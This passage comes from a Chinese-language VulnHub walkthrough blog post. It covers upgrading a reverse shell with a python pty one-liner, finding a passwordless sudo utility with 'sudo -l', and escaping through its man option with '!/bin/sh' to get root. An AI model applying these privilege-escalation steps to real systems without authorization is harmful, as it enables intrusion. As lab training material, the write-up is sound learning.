title="3.提权"></a>3.提权</h2><p>可以用下面的命令切换成tty.不然的话会没有上下文环境，很多命令执行不了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">"__import__('pty').spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102093155747.png"></p><p>从反弹的shell中可以看到当前权限为名为punk的用户。<br><strong>sudo -l 命令</strong>：查看授权的命令列表<br>可以看到&#x2F;home&#x2F;anansi&#x2F;bin&#x2F;anansi_util 命令可以无密码执行。</p><p><img src="/posts/229625f/image-20221102093222310.png"></p><p>执行一下这个命令</p><p><img src="/posts/229625f/image-20221102093320764.png"></p><p>依次执行看了一下，三个参数分别相当于以下命令</p><ul><li>ip a&#x2F;ipconfig 命令</li><li>top</li><li>man</li></ul><p>利用man命令进行权限提升，先执行man，再执行!&#x2F;bin&#x2F;sh，获得root权限。</p><p><img src="/posts/229625f/image-20221102093633412.png"></p><p>查看root文件夹下的证明文件b.txt</p><p><img src="/posts/229625f/image-20221102093708826.png"></p><p><strong>恭喜VulnHub的第一台靶机完成！！！！</strong></p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>此靶机考察的点：</p><ul><li>缓冲区溢出漏洞利用</li><li>linux命令</li><li>提权基础</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
